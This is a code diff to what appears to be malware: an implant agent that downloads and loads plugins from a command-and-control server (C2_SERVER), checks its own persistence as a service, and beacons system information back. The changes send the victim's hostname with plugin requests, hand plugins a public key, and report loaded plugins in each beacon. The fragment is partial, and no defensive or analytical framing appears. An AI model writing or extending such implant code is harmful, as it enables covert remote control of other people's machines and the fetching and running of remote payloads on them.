@@ -110,7 +110,8 @@ def exec_command(
         name = params.get('plugin_name', '')
         if not name:
             return 'load_plugin: no plugin_name'
-        path = plugin_loader.download_plugin(C2_SERVER, name)
+        hn = agent_state.get('hostname', '')
+        path = plugin_loader.download_plugin(C2_SERVER, name, hn)
         if not path:
             return f'load_plugin: failed to download {name}'
         info = plugin_loader.load_plugin_from_path(path)
@@ -137,7 +138,11 @@ def exec_command(
             lines.append(f'{pname} v{pdata.get("version", "?")} [{cmds}]')
         return '\n'.join(lines)
 
-    result = plugin_loader.dispatch(cmd, params, {'files': files, 'state': agent_state})
+    result = plugin_loader.dispatch(cmd, params, {
+        'files': files,
+        'state': agent_state,
+        'public_key': PUBLIC_KEY_PEM,
+    })
     if result is not None:
         return result
     return f'unknown command: {cmd}'
@@ -226,6 +231,7 @@ def beacon_loop():
 
     while True:
         info['persistent'] = is_persistent(SERVICE_NAME)
+        info['loaded_plugins'] = list(plugin_loader.list_plugins().keys())
         info['result'] = last_result
         result = send_beacon(
             C2_SERVER, info, TRAFFIC_KEY
